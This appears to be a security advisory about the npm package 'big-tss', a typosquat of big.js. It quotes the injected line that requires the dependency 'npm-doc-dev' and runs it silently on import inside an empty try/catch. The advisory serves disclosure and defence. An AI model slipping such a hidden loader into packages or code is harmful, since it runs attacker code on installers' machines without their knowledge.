summary: big-tss typosquats big.js and executes injected dependency npm-doc-dev on import
details: big-tss is a near-verbatim clone of big.js v7.0.1 with an injected block that require()s the runtime dependency `npm-doc-dev` and invokes `doc.from_str()` on module load, wrapped in an empty try/catch so any errors from the payload are silently swallowed. The injected line sits mid-file between the P.minus and P.mod method definitions of the cloned big.js body: `try { const doc = require("npm-doc-dev"); doc.from_str() } catch (error) { }`. Because the call fires at top-level module evaluation, any code exposed by `npm-doc-dev` runs in the installer's Node process the moment `require('big-tss')` (or a transitive import) is evaluated, with failures suppressed. The package name is a lookalike of the widely used `big.js`, and the injected loader + swallowed error handler have no relationship to arbitrary-precision arithmetic — the package acts as a lure that pulls attacker-controlled code into the installer via the `npm-doc-dev` dependency.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
